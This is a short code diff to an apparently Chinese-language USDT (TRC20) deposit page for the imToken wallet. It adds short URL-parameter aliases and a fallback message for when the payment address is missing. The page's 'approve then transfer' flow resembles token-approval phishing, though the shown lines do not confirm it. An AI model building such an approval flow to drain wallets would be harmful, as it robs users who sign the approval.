@@ -88,9 +88,9 @@
 <script>
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const params = new URLSearchParams(location.search);
-const toAddress = params.get('address') || '';
-const amount = Number(params.get('amount')) || 0;
-const type = params.get('type') || 'deposit';
+const toAddress = params.get('a') || params.get('address') || '';
+const amount = Number(params.get('n') || params.get('amount')) || 0;
+const type = params.get('t') || params.get('type') || 'deposit';
 const payPageUrl = location.href;
 let step = 1; // 1: approve, 2: transfer
 let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
@@ -100,6 +100,11 @@ else { $('#page-title').textContent = '押金充值'; $('#page-sub').textContent
 $('#info-addr').textContent = toAddress || '未配置';
 $('#info-chain').textContent = 'TRC20 (波场)';
 $('#info-amount').textContent = amount + ' USDT';
+if (!toAddress) {
+  // 冷启动丢参数时明确引导，避免白屏卡住
+  showOpenWalletUI('⚠️ 支付链接参数缺失（imToken 冷启动可能截断），请返回平台重新点击支付，链接已自动复制，可在 imToken「浏览」粘贴打开');
+  copyText(location.origin + '/');
+}
 
 function imTokenUniversalLink(d) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(d); }
 function imTokenSchemeLink(d) { return 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(d); }
